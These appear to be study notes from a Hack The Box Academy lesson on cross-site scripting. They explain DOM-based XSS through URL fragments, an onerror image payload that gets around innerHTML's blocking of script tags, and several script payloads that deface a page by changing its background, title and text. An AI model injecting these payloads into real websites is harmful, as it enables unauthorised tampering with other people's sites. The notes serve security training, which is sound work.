**The Hashtag Trick:** It often relies on parameters after a hashtag (`#`) in the URL. Web browsers process everything after the `#` locally; it is never sent to the backend server.
####  The Payload Bypass

The challenge notes that you cannot just use a basic `<script>alert(1)</script>` payload. This is a built-in security feature: the `innerHTML` function explicitly prevents `<script>` tags from executing.

To bypass this, you use an HTML element that executes JavaScript as a side effect.

```
<img src="" onerror=alert(window.origin)>
```

## Defacing

### Defacement Elements

We can utilize injected JavaScript code (through XSS) to make a web page look any way we like. However, defacing a website is usually used to send a simple message (i.e., we successfully hacked you), so giving the defaced web page a beautiful look isn't really the primary target.

Four HTML elements are usually utilized to change the main look of a web page:

- Background Color `document.body.style.background`
- Background `document.body.background`
- Page Title `document.title`
- Page Text `DOM.innerHTML`

```html
<script>document.body.style.background = "#141d2b"</script>
```
`Sets Background Colour to Black`

```html
<script>document.body.background = "https://www.hackthebox.eu/images/logo-htb.svg"</script>
```
`Setting an Background Image`

```html
<script>document.title = 'HackTheBox Academy'</script>
```
`Chhaing the page title`

```javascript
document.getElementById("todo").innerHTML = "New Text"
```
`Changing the page text`

```html
<script>document.getElementsByTagName('body')[0].innerHTML = '<center><h1 style="color: white">Cyber Security Training</h1><p style="color: white">by <img src="https://academy.hackthebox.com/images/logo-htb.svg" height="25px" alt="HTB Academy"> </p></center>'</script>
```
